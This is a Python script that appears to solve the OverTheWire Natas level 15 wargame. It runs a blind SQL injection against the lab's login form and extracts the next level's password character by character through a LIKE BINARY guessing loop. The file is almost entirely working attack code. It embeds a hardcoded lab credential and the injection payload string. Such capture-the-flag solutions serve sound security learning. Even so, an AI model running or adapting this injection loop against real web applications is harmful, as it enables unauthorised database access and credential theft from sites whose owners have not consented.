import requests
from requests.auth import HTTPBasicAuth

# Setup
target_url = "http://natas15.natas.labs.overthewire.org/"
auth = HTTPBasicAuth('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

print("Cracking password... please wait.")

# We know the password is 32 characters long
for i in range(32):
    for char in alphabet:
        # The Payload: 
        # Check if natas16 exists AND has a password starting with our current guess
        # BINARY makes it case-sensitive (important!)
        payload = f'natas16" AND password LIKE BINARY "{password + char}%'
        
        r = requests.post(target_url, auth=auth, data={'username': payload})
        
        if "This user exists" in r.text:
            password += char
            print(f"Found character: {password}")
            break

print(f"Final Password: {password}")
